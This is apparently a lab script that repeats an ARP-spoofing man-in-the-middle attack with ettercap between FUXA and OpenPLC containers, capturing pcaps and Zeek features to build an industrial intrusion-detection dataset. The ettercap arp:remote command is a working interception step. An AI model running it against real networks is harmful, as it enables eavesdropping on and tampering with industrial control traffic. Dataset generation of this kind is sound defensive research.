#!/usr/bin/env bash
# Repeat the MITM (ARP-spoofing) attack, capturing at the ATTACKER vantage
# (kali) so the poison ARP replies AND the relayed Modbus traffic are recorded.
# Each run is session mitm-NN; the export script collapses -NN -> "mitm".
#
# NOTE: MITM's signal lives at the ARP/L2 layer, NOT in modbus.log/conn.log.
# Analyse it with tshark on the pcap (arp.opcode==2), not the CSV feature set.
#
# Usage:  bash scripts/repeat-mitm.sh [N] [seconds]     (default N=5  dur=60)
set -uo pipefail
cd "$(dirname "$0")/.."
N="${1:-5}"; DUR="${2:-60}"
CAP_DIR="${IIOT_CAP_DIR:-$HOME/iiot-captures}"

# Resolve the iiot-net (172.18.x) IPs at runtime -- Docker reassigns them on restart.
ip18(){ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' "$1" \
          | tr ' ' '\n' | grep -m1 '^172\.18\.'; }
FUXA="$(ip18 fuxa)"; PLC="$(ip18 openplc)"
echo "[*] MITM victims:  FUXA=$FUXA   OpenPLC=$PLC"
[ -z "$FUXA" ] || [ -z "$PLC" ] && { echo "[!] could not resolve victim IPs"; exit 1; }

for i in $(seq -w 1 "$N"); do
  SESS="$CAP_DIR/sessions/mitm-$i"; mkdir -p "$SESS"
  echo "================  mitm-$i  (${DUR}s)  ================"

  docker rm -f cap-mitm >/dev/null 2>&1 || true
  docker run -d --name cap-mitm --net=container:kali -v "$SESS:/caps" \
    --entrypoint sh nicolaka/netshoot -c "tcpdump -i any -w /caps/mitm.pcap" >/dev/null
  sleep 3

  docker exec kali timeout "$DUR" \
    ettercap -T -q -i eth0 -M arp:remote "/$FUXA//" "/$PLC//" || true

  docker stop cap-mitm >/dev/null 2>&1 || true    # graceful stop -> clean pcap
  docker rm   cap-mitm >/dev/null 2>&1 || true

  # repair (belt-and-suspenders) then extract Zeek features
  docker run --rm -v "$SESS:/caps" nicolaka/netshoot \
    sh -c "editcap /caps/mitm.pcap /caps/mitm_clean.pcap 2>/dev/null || cp /caps/mitm.pcap /caps/mitm_clean.pcap"
  docker run --rm -v "$SESS:/caps" -w /caps zeek/zeek:latest zeek -C -r mitm_clean.pcap || true

  # quick ARP-spoof proof for this run
  echo "[*] ARP replies (ip -> mac) in mitm-$i:"
  docker run --rm -v "$SESS:/caps" nicolaka/netshoot \
    tshark -r /caps/mitm_clean.pcap -Y "arp.opcode==2" \
    -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac 2>/dev/null | sort | uniq -c
  echo "[+] done: mitm-$i"
done
echo
echo "[*] Re-export:  bash scripts/export-dataset-csv.sh"
